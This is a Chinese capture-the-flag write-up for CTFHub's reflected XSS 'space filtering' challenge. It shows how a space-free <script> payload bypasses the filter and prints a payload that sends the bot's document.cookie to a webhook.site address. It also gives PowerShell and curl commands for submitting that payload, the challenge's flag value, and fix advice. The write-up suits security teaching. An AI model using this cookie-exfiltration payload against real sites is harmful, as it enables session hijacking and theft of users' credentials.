CTFHub - Web - XSS - 空格过滤

# CTFHub # Web # XSS # 空格过滤 # Bot 外带

一、题目信息

  • 题目名称：XSS 空格过滤
  • 题目方向：Web - XSS - 反射型
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：绕过空格过滤执行 XSS，将 Bot Cookie 外带并取得 Flag。

二、漏洞分析

访问根路径会重定向到 /?name=CTFHub，并显示欢迎语。输入被直接拼接到 <h1> 标签中：

<h1>Hello, CTFHub
</h1>

提交 name=CTFHub%20test 后，空格被直接删除，说明服务端对普通空格进行了过滤。由于其他 HTML 特殊字符未被过滤，可以闭合文本节点并注入无空格的 <script> 载荷。

空格过滤不等于 XSS 防护。标签之间或 JavaScript 表达式中通常不需要空格，过滤单个字符无法阻止脚本执行。

三、验证反射与脚本执行

先提交不含空格的测试载荷：

<script>alert(1)</script>

对应请求：

curl.exe -i "http://<target>/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

响应中可以看到原始标签被反射。页面底部提供 Send URL to Bot，Bot 使用 HeadlessChrome 访问指定 URL，Flag 位于 Bot 可被 JavaScript 读取的 Cookie 中。

四、构造外带 Payload

创建临时的公网 Webhook，并将 Cookie 拼接到跳转地址。以下载荷不含空格，可以直接通过过滤：

<script>location='https://webhook.site/<token>/?'+document.cookie</script>

使用 PowerShell 对 name 参数进行 URL 编码，得到完整的 Bot 访问地址：

$payload = "<script>location='https://webhook.site/<token>/?'+document.cookie</script>"
$target = "http://<target>/?name=" + [uri]::EscapeDataString($payload)

五、提交给 Bot

当前环境的 /submit 接口接受表单编码，直接提交 JSON 会返回 400 Bad Request。可用以下命令触发 Bot：

curl.exe -i -X POST --data-urlencode "url=$target" "http://<target>/submit"

触发成功时返回：

{
  "code": 0,
  "msg": "Successfully"
}

六、读取回调

Bot 渲染页面后执行脚本并携带 Cookie 访问 Webhook。回调请求的查询参数中包含 Flag：

GET /?flag=ctfhub{dd80f5eca0ecb2dd3333c1ab}

七、最终 Flag

ctfhub{dd80f5eca0ecb2dd3333c1ab}

八、修复建议

  • 根据输出上下文对不可信输入执行 HTML 实体编码，避免直接拼接用户输入。
  • 禁止使用字符串黑名单过滤 XSS，应使用成熟的上下文相关编码方案。
  • 为敏感 Cookie 设置 HttpOnly 和 SameSite，降低脚本读取与外带风险。
  • 配置 CSP，限制内联脚本、外部脚本和未经授权的网络请求。
